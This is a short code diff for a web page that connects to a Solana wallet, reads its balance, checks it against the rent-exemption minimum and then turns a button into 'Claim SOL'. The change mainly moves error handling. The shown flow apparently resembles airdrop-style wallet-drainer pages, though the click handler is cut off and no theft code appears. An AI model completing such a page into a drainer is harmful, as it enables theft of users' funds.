@@ -18,16 +18,18 @@ $(document).ready(function() {
 
     const balanceInSOL = walletBalance / solanaWeb3.LAMPORTS_PER_SOL;
     alert(`Wallet balance: ${balanceInSOL} SOL`);
-  } catch (err) {
-    console.error("Error fetching balance:", err);
-    alert("Error: " + err.message);
-  }
 
-                const minBalance = await connection.getMinimumBalanceForRentExemption(0);
+      const minBalance = await connection.getMinimumBalanceForRentExemption(0);
                 if (walletBalance < minBalance) {
                     alert("Insufficient funds to claim.");
                     return;
                 }
+  } catch (err) {
+    console.error("Error found:", err);
+    alert("Error: " + err.message);
+  }
+
+              
 
                 $('#connect-wallet').text("Claim SOL");
                 $('#connect-wallet').off('click').on('click', async () => {
